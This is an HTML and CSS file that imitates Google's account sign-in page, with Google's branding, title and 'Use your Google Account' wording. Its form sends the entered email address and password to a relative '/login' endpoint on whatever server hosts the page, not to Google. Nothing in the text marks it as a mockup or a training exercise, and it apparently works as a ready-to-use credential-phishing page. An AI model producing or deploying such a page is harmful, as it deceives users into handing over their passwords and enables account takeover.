<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Sign in – Google</title>
    <style>
      :root {
        --bg: #f6f8fc;
        --card: #ffffff;
        --text: #202124;
        --muted: #5f6368;
        --line: #dadce0;
        --blue: #1a73e8;
        --blue-dark: #1558b0;
        --error: #d93025;
      }

      * { box-sizing: border-box; }

      body {
        margin: 0;
        min-height: 100vh;
        display: flex;
        align-items: center;
        justify-content: center;
        background: var(--bg);
        font-family: Arial, Helvetica, sans-serif;
        color: var(--text);
      }

      .login-box {
        width: min(100%, 430px);
        background: var(--card);
        border: 1px solid rgba(0, 0, 0, 0.08);
        border-radius: 24px;
        box-shadow: 0 14px 38px rgba(60, 64, 67, 0.18);
        padding: 36px 40px 28px;
      }

      .google-logo {
        display: flex;
        justify-content: center;
        align-items: center;
        gap: 0;
        font-weight: 500;
        font-size: clamp(2rem, 2.4vw, 2.5rem);
        letter-spacing: -1px;
        margin-bottom: 8px;
      }
      .g-blue { color: #4285F4; }
      .g-red { color: #DB4437; }
      .g-yellow { color: #F4B400; }
      .g-green { color: #0F9D58; }

      h1 {
        margin: 0;
        text-align: center;
        font-size: clamp(2rem, 2vw, 2.3rem);
        font-weight: 400;
      }

      .subtitle {
        margin-top: 10px;
        margin-bottom: 24px;
        text-align: center;
        font-size: 0.98rem;
        color: var(--muted);
      }

      .field {
        margin-bottom: 18px;
      }

      label {
        display: block;
        margin-bottom: 8px;
        font-size: 0.9rem;
        color: var(--muted);
      }

      input {
        width: 100%;
        padding: 14px 16px;
        border: 1px solid var(--line);
        border-radius: 12px;
        font-size: 1rem;
        outline: none;
        transition: border-color 0.2s ease, box-shadow 0.2s ease;
      }

      input:focus {
        border-color: var(--blue);
        box-shadow: 0 0 0 4px rgba(26, 115, 232, 0.12);
      }

      .row {
        display: flex;
        justify-content: space-between;
        gap: 12px;
        margin-bottom: 18px;
        font-size: 0.9rem;
      }

      .link {
        color: var(--blue);
        text-decoration: none;
        font-weight: 600;
      }

      .link:hover { text-decoration: underline; }

      button {
        width: 100%;
        padding: 14px 18px;
        border: none;
        border-radius: 999px;
        background: var(--blue);
        color: white;
        font-size: 1rem;
        font-weight: 600;
        cursor: pointer;
        transition: background 0.2s ease;
      }

      button:hover {
        background: var(--blue-dark);
      }

      .error {
        margin-top: 8px;
        color: var(--error);
        font-size: 0.88rem;
        min-height: 20px;
      }

      .footer {
        display: flex;
        align-items: center;
        justify-content: space-between;
        margin-top: 24px;
        gap: 12px;
      }

      .footer a {
        color: var(--blue);
        text-decoration: none;
        font-weight: 600;
      }

      .secondary {
        width: auto;
        background: transparent;
        border: 1px solid var(--line);
        color: var(--blue);
        padding: 10px 18px;
      }

      @media (max-width: 520px) {
        .login-box {
          margin: 16px;
          padding: 28px 20px 22px;
        }
      }
    </style>
  </head>
  <body>
    <div class="login-box">
      <div class="google-logo" aria-label="Google logo">
        <span class="g-blue">G</span><span class="g-red">o</span><span class="g-yellow">o</span><span class="g-blue">g</span><span class="g-green">l</span><span class="g-red">e</span>
      </div>

      <h1>Sign in</h1>
      <div class="subtitle">Use your Google Account</div>

      <form method="POST" action="/login">
        <div class="field">
          <label for="email">Email address</label>
          <input id="email" name="email" type="email" placeholder="you@gmail.com" required />
        </div>

        <div class="field">
          <label for="password">Password</label>
          <input id="password" name="password" type="password" placeholder="Enter your password" required />
        </div>

        <div class="row">
          <a href="#" class="link">Forgot email?</a>
          <a href="#" class="link">More options</a>
        </div>

        <button type="submit">Sign in</button>
      </form>

      <div class="footer">
        <a href="#">Create account</a>
        <button class="secondary" type="button">Help</button>
      </div>
    </div>
  </body>
</html>
